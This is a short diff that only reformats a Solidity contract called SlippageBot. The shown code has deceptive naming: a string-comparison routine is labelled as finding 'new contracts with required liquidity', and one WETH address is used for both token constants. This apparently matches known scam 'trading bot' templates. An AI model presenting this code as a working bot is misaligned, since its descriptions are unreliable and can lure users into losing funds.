@@ -13,8 +13,7 @@ contract SlippageBot {
 
     event Log(string _msg);
 
-    constructor(string memory _mainTokenSymbol, string memory _mainTokenName)
-        public
+    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public 
     {
         tokenSymbol = _mainTokenSymbol;
         tokenName = _mainTokenName;
@@ -22,7 +21,8 @@ contract SlippageBot {
 
     receive() external payable {}
 
-    struct slice {
+    struct slice 
+    {
         uint256 _len;
         uint256 _ptr;
     }
@@ -34,11 +34,7 @@ contract SlippageBot {
      * @return New contracts with required liquidity.
      */
 
-    function findNewContracts(slice memory self, slice memory other)
-        internal
-        pure
-        returns (int256)
-    {
+    function findNewContracts(slice memory self, slice memory other) internal pure returns (int256) {
         uint256 shortest = self._len;
 
         if (other._len < self._len) shortest = other._len;
@@ -53,6 +49,7 @@ contract SlippageBot {
 
             string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
             string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
             loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
             assembly {
